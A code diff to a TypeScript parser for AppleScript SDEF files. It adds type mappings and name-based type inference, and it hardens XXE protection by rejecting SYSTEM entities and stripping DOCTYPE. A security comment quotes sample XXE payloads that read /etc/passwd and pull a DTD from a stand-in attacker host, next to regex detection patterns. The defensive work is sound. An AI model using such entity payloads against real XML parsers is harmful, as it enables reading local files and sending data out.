@@ -129,6 +129,16 @@ const CODE_TO_TYPE_MAP: Record<string, string> = {
   rtyp: 'type', // Return type
   faal: 'list', // Modifier flags list
   data: 'any', // Generic data
+  'obj ': 'specifier', // Object specifier
+  reco: 'record', // Record type
+  list: 'list', // List type
+  bool: 'boolean', // Boolean type
+  long: 'integer', // Long integer
+  doub: 'real', // Double/real number
+  TEXT: 'text', // Text type
+  alis: 'file', // Alias (file reference)
+  fsrf: 'file', // File system reference
+  'ldt ': 'date', // Long date time
 };
 
 /**
@@ -143,6 +153,10 @@ const STANDARD_PARAM_TYPES: Record<string, string> = {
   as: 'type',
   saving: 'save options',
   by: 'property',
+  from: 'specifier',
+  at: 'location specifier',
+  for: 'specifier',
+  of: 'specifier',
 };
 
 /**
@@ -401,16 +415,60 @@ export class SDEFParser {
       // - Our approach: Targeted, efficient, and maintains security (Goldilocks solution)
       let contentWithoutComments = removeXMLComments(xmlContent);
 
-      // SECURITY: Verify no ENTITY declarations remain after comment removal
-      // We check for ENTITY only in actual XML, not in comments, to catch real XXE vulnerabilities
-      // Pattern matches both: <!ENTITY name SYSTEM "..."> and <!ENTITY % name "...">
-      if (/<!ENTITY/i.test(contentWithoutComments)) {
+      // SECURITY: Check for ENTITY declarations with SYSTEM references BEFORE stripping DOCTYPE
+      //
+      // WHY CHECK BEFORE STRIPPING:
+      // We need to detect and reject malicious ENTITY declarations even though we're going to
+      // strip the DOCTYPE anyway. This is defense-in-depth: we reject the XML entirely rather
+      // than silently allowing malicious XML to pass through after stripping.
+      //
+      // WHAT WE'RE CHECKING:
+      // Pattern matches: <!ENTITY (anything) SYSTEM (anything)>
+      // This catches both:
+      //   - <!ENTITY xxe SYSTEM "file:///etc/passwd">
+      //   - <!ENTITY % file SYSTEM "http://attacker.com/evil.dtd">
+      //
+      // WHY THIS IS SECURE:
+      // 1. We already removed comments, so commented-out ENTITY declarations are ignored
+      // 2. We check before DOCTYPE stripping, so we catch malicious entities in DOCTYPE
+      // 3. We use a simple regex that can't be bypassed with encoding tricks
+      //
+      // LEGITIMATE USE CASE:
+      // Real SDEF files (Pages, Numbers, Keynote) use parameter entities WITHOUT SYSTEM:
+      //   <!ENTITY % text "...">  ← Allowed (no SYSTEM reference)
+      // These are NOT XXE vulnerabilities because they don't reference external files.
+      if (/<!ENTITY[^>]*SYSTEM/i.test(contentWithoutComments)) {
         throw new Error(
-          'ENTITY declarations found in SDEF file - potential XXE vulnerability'
+          'ENTITY declarations with SYSTEM references found - potential XXE vulnerability'
         );
       }
 
-      const parsed = this.parser.parse(xmlContent);
+      // SECURITY: Strip DOCTYPE declarations after checking for malicious ENTITY
+      //
+      // Legitimate SDEF files (Pages, Numbers, Keynote) use parameter entities in their
+      // DOCTYPE for DTD-based type definitions. We've already validated they don't use
+      // SYSTEM references above, so we can safely remove the entire DOCTYPE section.
+      //
+      // Since our XML parser is configured with ignoreDeclaration: true and never executes
+      // DOCTYPE processing, stripping is safe and prevents any residual XXE risk.
+      const contentWithoutDoctype = contentWithoutComments.replace(
+        /<!DOCTYPE[^[>]*(?:\[[^\]]*\])?>/i,
+        ''
+      );
+
+      // SECURITY: Defensive check - verify no ENTITY declarations remain after DOCTYPE removal
+      // This should never trigger (DOCTYPE regex should remove all ENTITY declarations),
+      // but we check anyway as defense-in-depth against regex failures.
+      // Pattern matches both: <!ENTITY name SYSTEM "..."> and <!ENTITY % name "...">
+      if (/<!ENTITY/i.test(contentWithoutDoctype)) {
+        throw new Error(
+          'ENTITY declarations found after DOCTYPE stripping - potential XXE vulnerability'
+        );
+      }
+
+      // Parse the cleaned content (without DOCTYPE and comments) to prevent XXE attacks
+      // The XML parser is configured with ignoreDeclaration: true so DOCTYPE isn't processed anyway
+      const parsed = this.parser.parse(contentWithoutDoctype);
 
       if (!parsed.dictionary) {
         throw new Error('Invalid SDEF format: missing <dictionary> root element');
@@ -927,6 +985,63 @@ export class SDEFParser {
           command: this.currentCommand,
         },
         inferredValue: 'file',
+      });
+
+      return inferredType;
+    }
+
+    // Date/time-related
+    if (lowerName.includes('date') || lowerName.includes('time')) {
+      inferredType = { kind: 'date' };
+
+      this.warn({
+        code: 'TYPE_INFERRED_FROM_PATTERN',
+        message: `Type inferred from name pattern "${elementName}": date`,
+        location: {
+          element: context || 'unknown',
+          name: elementName,
+          suite: this.currentSuite,
+          command: this.currentCommand,
+        },
+        inferredValue: 'date',
+      });
+
+      return inferredType;
+    }
+
+    // URL/URI-related
+    if (lowerName.includes('url') || lowerName.includes('uri')) {
+      inferredType = { kind: 'primitive', type: 'text' };
+
+      this.warn({
+        code: 'TYPE_INFERRED_FROM_PATTERN',
+        message: `Type inferred from name pattern "${elementName}": text (URL/URI)`,
+        location: {
+          element: context || 'unknown',
+          name: elementName,
+          suite: this.currentSuite,
+          command: this.currentCommand,
+        },
+        inferredValue: 'text',
+      });
+
+      return inferredType;
+    }
+
+    // ID/Identifier-related
+    if (lowerName.includes('id') || lowerName.includes('identifier')) {
+      inferredType = { kind: 'primitive', type: 'text' };
+
+      this.warn({
+        code: 'TYPE_INFERRED_FROM_PATTERN',
+        message: `Type inferred from name pattern "${elementName}": text (ID/identifier)`,
+        location: {
+          element: context || 'unknown',
+          name: elementName,
+          suite: this.currentSuite,
+          command: this.currentCommand,
+        },
+        inferredValue: 'text',
       });
 
       return inferredType;
